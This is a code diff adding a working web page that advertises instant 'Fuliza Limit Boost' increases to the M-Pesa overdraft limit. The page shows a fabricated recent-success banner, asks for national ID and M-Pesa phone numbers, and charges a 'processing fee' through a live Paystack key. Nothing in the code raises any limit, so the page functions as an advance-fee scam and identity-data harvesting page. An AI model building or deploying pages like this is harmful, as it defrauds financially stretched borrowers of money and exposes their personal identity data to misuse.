@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Fuliza Limit Boost</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://js.paystack.co/v1/inline.js"></script>
+  <style>
+    /* custom colors and fonts */
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+    body { font-family: 'Inter', sans-serif; }
+
+    .card:hover { transform: scale(1.02); box-shadow: 0 4px 14px rgba(0,0,0,0.1); }
+    .card { transition: transform 0.2s, box-shadow 0.2s; border: 2px solid transparent; }
+    .selected { border-color: #16a34a; }
+  </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
+  <div class="max-w-xl w-full bg-white rounded-2xl shadow-lg p-6">
+    <!-- Header -->
+    <header class="text-center mb-6">
+      <h1 class="text-3xl font-bold text-red-600">FULIZA LIMIT BOOST</h1>
+      <p class="mt-2 text-gray-600">Instant Limit Increase &bull; No Paperwork &bull; Same Day Access</p>
+      <div class="mt-4 p-3 bg-green-100 rounded-lg flex items-center text-green-800 text-sm">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M12 20a8 8 0 100-16 8 8 0 000 16z" />
+        </svg>
+        <span>Choose your new Fuliza limit and complete the payment to get instant access.</span>
+      </div>
+    </header>
+
+    <!-- Recent Increase -->
+    <section class="mb-6">
+      <div class="bg-white rounded-lg shadow p-4 flex items-center">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-green-500 mr-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+        </svg>
+        <div>
+          <div class="text-sm text-gray-600">Recent Increase</div>
+          <div class="text-sm font-semibold">D722*** increased to Ksh 21,000 &bull; 15 mins ago</div>
+          <div class="w-full h-2 bg-red-300 rounded-full mt-2 overflow-hidden">
+            <div class="h-full bg-green-500" style="width: 70%;"></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Selection Grid -->
+    <section class="mb-6">
+      <h2 class="text-lg font-semibold mb-3">Select Your Fuliza Limit</h2>
+      <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+        <!-- cards inserted by JS -->
+      </div>
+    </section>
+
+    <!-- CTA -->
+    <button id="cta" class="w-full bg-green-500 hover:bg-green-600 text-white py-3 rounded-lg shadow-lg transition-colors disabled:opacity-50" disabled>
+      ⚡ Get Limit Now
+    </button>
+  </div>
+
+  <!-- Modal overlay -->
+  <div id="modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden">
+    <div class="bg-white rounded-2xl w-full max-w-md p-6 relative">
+      <button id="closeModal" class="absolute top-3 right-3 text-gray-500 hover:text-gray-700">&times;</button>
+      <h2 class="text-xl font-semibold text-center mb-2">Complete Your Request</h2>
+      <p class="text-center text-sm mb-4">Enter your details to boost your Fuliza limit to <span id="modalAmount" class="font-bold text-green-600"></span></p>
+      <div class="bg-green-100 p-4 rounded-lg mb-4">
+        <div class="flex justify-between mb-2">
+          <span>New Limit:</span>
+          <span id="modalLimit" class="font-bold text-green-600"></span>
+        </div>
+        <div class="flex justify-between">
+          <span>Processing Fee:</span>
+          <span id="modalFee" class="font-bold text-green-600"></span>
+        </div>
+      </div>
+      <form id="modalForm" class="space-y-4">
+        <div>
+          <label class="block text-sm font-medium text-gray-700">ID Number</label>
+          <input type="text" id="idNumber" class="mt-1 block w-full border border-gray-300 rounded-lg p-2" placeholder="Enter your ID number" required />
+        </div>
+        <div>
+          <label class="block text-sm font-medium text-gray-700">M-Pesa Phone Number</label>
+          <input type="tel" id="phoneNumber" class="mt-1 block w-full border border-gray-300 rounded-lg p-2" placeholder="0712345678" required />
+          <p class="text-xs text-gray-500 mt-1">You will receive an M-Pesa STK push on this number</p>
+        </div>
+        <!-- using button instead of anchor for better control -->
+        <button id="payLink" class="w-full block text-center bg-green-500 hover:bg-green-600 text-white py-3 rounded-lg shadow-lg transition-colors">
+          ⚡ PAY THE PROCESSING FEE
+        </button>
+      </form>
+      <p class="text-center text-xs text-gray-400 mt-4">Secure payment powered by KKASS TECH DEVELOPER</p>
+    </div>
+  </div>
+
+  <script>
+    const options = [
+      {amount:5000, fee:150},
+      {amount:7500, fee:199},
+      {amount:10000, fee:249},
+      {amount:12500, fee:345},
+      {amount:16000, fee:450},
+      {amount:21000, fee:550},
+      {amount:25500, fee:649, hot:true},
+      {amount:30000, fee:700, hot:true},
+      {amount:35000, fee:850},
+      {amount:40000, fee:1000},
+      {amount:45000, fee:1250},
+      {amount:50000, fee:1500},
+      {amount:60000, fee:1750},
+      {amount:70000, fee:2050},
+    ];
+
+    const grid = document.querySelector('section:nth-child(3) .grid');
+    let selectedCard = null;
+
+    function format(amount) {
+      return amount.toLocaleString();
+    }
+
+    options.forEach(opt => {
+      const card = document.createElement('div');
+      card.dataset.amount = opt.amount;
+      card.dataset.fee = opt.fee;
+      card.className = 'card bg-white p-4 rounded-lg shadow cursor-pointer relative border-2 border-transparent';
+      card.innerHTML = `
+        <div class="text-xl font-bold">Ksh ${format(opt.amount)}</div>
+        <div class="text-sm text-green-600 mt-1">Fee Ksh ${format(opt.fee)}</div>
+        <svg xmlns=\"http://www.w3.org/2000/svg\" class=\"h-5 w-5 text-gray-400 absolute top-2 right-2 opacity-0\" fill=\"none\" viewBox=\"0 0 24 24\" stroke=\"currentColor\"><path stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" d=\"M5 13l4 4L19 7\" /></svg>
+      `;
+      if (opt.hot) {
+        const badge = document.createElement('span');
+        badge.textContent = 'HOT';
+        badge.className = 'absolute top-2 left-2 bg-red-500 text-white text-xs px-1 rounded';
+        card.appendChild(badge);
+      }
+      card.addEventListener('click', () => {
+        if (selectedCard) {
+          selectedCard.classList.remove('selected');
+          const oldIcon = selectedCard.querySelector('svg');
+          oldIcon.classList.remove('text-green-500');
+          oldIcon.classList.add('text-gray-400','opacity-0');
+        }
+        card.classList.add('selected');
+        const icon = card.querySelector('svg');
+        icon.classList.remove('opacity-0','text-gray-400');
+        icon.classList.add('text-green-500','opacity-100');
+        selectedCard = card;
+        document.getElementById('cta').disabled = false;
+      });
+      grid.appendChild(card);
+    });
+
+    document.getElementById('cta').addEventListener('click', () => {
+      if (!selectedCard) return;
+      // show modal with details fetched from card dataset
+      const amountValue = parseFloat(selectedCard.dataset.amount);
+      const feeValue = parseFloat(selectedCard.dataset.fee);
+      document.getElementById('modalAmount').textContent = `Ksh ${amountValue.toLocaleString()}`;
+      document.getElementById('modalLimit').textContent = `Ksh ${amountValue.toLocaleString()}`;
+      document.getElementById('modalFee').textContent = `Ksh ${feeValue.toLocaleString()}`;
+      document.getElementById('modal').classList.remove('hidden');
+    });
+
+    // modal close and form submit
+    document.getElementById('closeModal').addEventListener('click', () => {
+      document.getElementById('modal').classList.add('hidden');
+    });
+
+    function payWithPaystack(amount, idNumber, phoneNumber) {
+      const ref = 'FULIZA_' + Date.now();
+      
+      const handler = PaystackPop.setup({
+        key: 'pk_live_19caaea5b3f865073305c366d05254d3f50bcf1a',
+        email: 'customer@fuliza.com',
+        amount: amount * 100, // Amount in kobo
+        currency: 'KES',
+        ref: ref,
+        label: "Fuliza Limit Boost Payment",
+        metadata: {
+          phone: phoneNumber,
+          id_number: idNumber
+        },
+        callback: function(response) {
+          alert(`Payment successful! Reference: ${response.reference}`);
+          // Redirect back to main page
+          window.location.href = '/?success=true&ref=' + response.reference;
+        },
+        onClose: function() {
+          alert('Payment was not completed. You can try again.');
+          window.location.href = '/';
+        }
+      });
+      
+      handler.openIframe();
+    }
+
+    // handle click on pay link to initiate payment
+    document.getElementById('payLink').addEventListener('click', (e) => {
+      e.preventDefault();
+      const idNumber = document.getElementById('idNumber').value.trim();
+      const phone = document.getElementById('phoneNumber').value.trim();
+      const fee = parseFloat(document.getElementById('modalFee').textContent.replace(/[^0-9]/g,''));
+
+      if (!idNumber || !phone) {
+        alert('Please fill in all fields');
+        return;
+      }
+
+      payWithPaystack(fee, idNumber, phone);
+      document.getElementById('modal').classList.add('hidden');
+    });
+  </script>
+</body>
+</html>
